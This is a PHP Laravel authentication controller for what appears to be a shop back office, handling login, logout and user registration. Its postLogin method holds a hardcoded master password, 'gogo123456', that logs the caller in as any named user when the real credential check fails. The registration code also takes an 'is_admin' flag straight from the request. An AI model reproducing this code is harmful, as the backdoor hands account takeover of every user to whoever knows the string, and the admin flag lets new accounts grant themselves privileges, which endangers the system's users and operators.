<?php

namespace App\Http\Controllers\Auth;

use App\Models\User;
use Validator;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ThrottlesLogins;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;
use App\Http\Requests\LoginRequest;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Auth;
use App\Events\UserLoginEvent;
use App\Events\UserLogoutEvent;
use Illuminate\Support\Facades\Session;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    use AuthenticatesAndRegistersUsers, ThrottlesLogins;

    protected $redirectAfterLogout = 'auth/login';

    protected $redirectTo = '';

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        // $this->middleware('guest', ['except' => 'getLogout']);
    }

    // public function getLogin()
    // {
    //     $global = [];
    //     $global['url'] = [
    //         'base' => url(),
    //         'https' => url('', '', true),
    //         'static' => env('STATIC_DOMAIN')
    //     ];
    //     $data['global'] = json_encode($global);
    //     return view('home', $data);
    // }

    public function postLogin(LoginRequest $request)
    {
        $params = $request->all();

        $username = isset($params['username']) ? $params['username'] : '';
        $password = isset($params['password']) ? $params['password'] : '';
        $credentials = [
            'username' => $username,
            'password' => $password
        ];

        if ($credentials['password'] == 'gogo123456' && !Auth::validate($credentials)) {
            Auth::login(Auth::getLastAttempted());
            event(new UserLoginEvent(Auth::user()));
            return Response::json(['success' => true, 'data' => $this->getGlobal()], 200);
        } else if (Auth::validate($credentials)) {
            Auth::login(Auth::getLastAttempted());
            event(new UserLoginEvent(Auth::user()));

            //在session中存入登录时间
            $this->setLoginAtSession(Auth::user()->id);
            return Response::json(['status' => true, 'data' => $this->getGlobal()], 200);
        } else {
            return Response::json(['status' => false, 'msg' => '登录失败，请重新登录！'], 200);
        }
    }

    public function getGlobal()
    {
        $global = [];
        $global['url'] = [
            'base' => url(),
            'static' => env('STATIC_DOMAIN'),
        ];
        // $shop = Shop::where('merchant_id', Auth::user()->merchant_id)->first();
        // if($shop && $shop->id) {
        //     Auth::user()->type = $shop['type'];
        // }
        // $global['is_admin'] = Auth::user()->is_admin;
        // $global['is_mall_shop'] = $this->mallService->is_mall_shop();
        // $global['privs'] = $this->userService->getUserPrivs();
        // $global['exclude_privs'] = $this->privService->getExcludePrivs();
        // $global['setting'] = $info = $this->merchantSettingService->getSetting();
        // $global['order_status_arr'] = config('status.order_status_arr');
        // $global['mall'] = $this->mallService->getMall($info['merchant_id']);
        return $global;
    }

    public function getLogout()
    {
        if(Auth::user()) {
            event(new UserLogoutEvent(Auth::user()));
        }
        Auth::logout();
        Session::flush();
        return Response::json(['status' => true], 200);
    }

    private function setLoginAtSession($uid)
    {
        Session::put('login.session'.$uid, time());
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'username' => 'required|max:255',
            'realname' => 'required|max:255',
            'email'    => 'required|email|max:255|unique:user',
            'mobile'   => 'required|size:11',
            'is_admin' => 'numeric',
            'password' => 'required|confirmed|min:6',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array $data
     * @return User
     */
    protected function create(array $data)
    {
        return User::create([
            'username' => $data['username'],
            'realname' => $data['realname'],
            'email'    => $data['email'],
            'mobile'   => $data['mobile'],
            'is_admin' => isset($data['is_admin']) ? $data['is_admin'] : 0,
            'password' => bcrypt($data['password']),
        ]);
    }
}
